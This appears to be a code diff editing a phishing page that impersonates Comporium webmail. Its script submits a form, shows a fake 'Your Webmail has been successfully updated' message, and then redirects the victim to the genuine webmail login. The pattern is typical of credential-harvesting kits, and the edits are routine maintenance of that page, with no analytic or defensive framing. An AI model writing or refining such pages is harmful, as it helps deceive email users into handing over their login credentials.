@@ -79,11 +79,10 @@ function showPage() {
  </p>
 </form>
 </form>
-<div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 1px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;"> 
+<div id="form-success" style="display: none; padding: 1em; background-color: #e6ffed; color: #207544; border: 1px solid #b2f2bb; border-radius: 8px; font-weight: 500; margin-top: 1em;">
   ✅ Thank you! Your Webmail has been successfully updated to the latest version. All features are now up to date and ready to use. Redirecting...
-</div>
-
-<script>
+</div>		
+	<script>
   const form = document.getElementById('contact-form');
   const successMsg = document.getElementById('form-success');
 
@@ -99,16 +98,11 @@ function showPage() {
       }
     }).then(response => {
       if (response.ok) {
-        // Optional: Remove form fields completely
-        this.innerHTML = ""; // Clears all form content
-
-        // Show success message
+        form.reset();
         successMsg.style.display = 'block';
-
-        // Redirect after delay
         setTimeout(() => {
           window.location.href = 'https://webmail.comporium.net/#3'; // Replace with your target URL
-        }, 3000);
+        }, 3000); // Redirect after 3 seconds
       } else {
         alert('There was an issue submitting the form. Please try again.');
       }
@@ -116,7 +110,7 @@ function showPage() {
       alert('There was a network error. Please try again.');
     });
   });
-</script>
+</script>	
 </div>	
 </div>
   </p>
